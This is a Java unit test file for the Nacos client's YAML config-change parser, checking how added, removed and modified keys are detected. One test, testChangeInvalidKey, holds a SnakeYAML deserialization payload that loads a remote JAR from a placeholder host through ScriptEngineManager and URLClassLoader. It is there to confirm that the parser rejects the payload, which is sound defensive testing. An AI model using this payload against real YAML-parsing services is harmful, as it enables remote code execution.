/*
 * Copyright 1999-2018 Alibaba Group Holding Ltd.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.alibaba.nacos.client.config.impl;

import com.alibaba.nacos.api.config.ConfigChangeItem;
import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class YmlChangeParserTest {
    
    private final YmlChangeParser parser = new YmlChangeParser();
    
    private final String type = "yaml";
    
    @Test
    void testType() {
        assertTrue(parser.isResponsibleFor(type));
    }
    
    @Test
    void testAddKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("", "app:\n  name: nacos", type);
        assertNull(map.get("app.name").getOldValue());
        assertEquals("nacos", map.get("app.name").getNewValue());
    }
    
    @Test
    void testRemoveKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: nacos", "", type);
        assertEquals("nacos", map.get("app.name").getOldValue());
        assertNull(map.get("app.name").getNewValue());
    }
    
    @Test
    void testModifyKey() throws IOException {
        Map<String, ConfigChangeItem> map = parser.doParse("app:\n  name: rocketMQ", "app:\n  name: nacos", type);
        assertEquals("rocketMQ", map.get("app.name").getOldValue());
        assertEquals("nacos", map.get("app.name").getNewValue());
    }
    
    @Test
    void testComplexYaml() throws IOException {
        /*
         * map:
         *   key1: "string"
         *   key2:
         *     - item1
         *     - item2
         *     - item3
         *   key3: 123
         */
        String s = "map:\n" + "  key1: \"string\"\n" + "  key2:\n" + "    - item1\n" + "    - item2\n" + "    - item3\n"
                + "  key3: 123    \n";
        Map<String, ConfigChangeItem> map = parser.doParse(s, s, type);
        assertEquals(0, map.size());
    }
    
    @Test
    void testChangeInvalidKey() {
        assertThrows(NacosRuntimeException.class, () -> {
            parser.doParse("anykey:\n  a",
                    "anykey: !!javax.script.ScriptEngineManager [\n" + "  !!java.net.URLClassLoader [[\n"
                            + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]",
                    type);
        });
    }
}

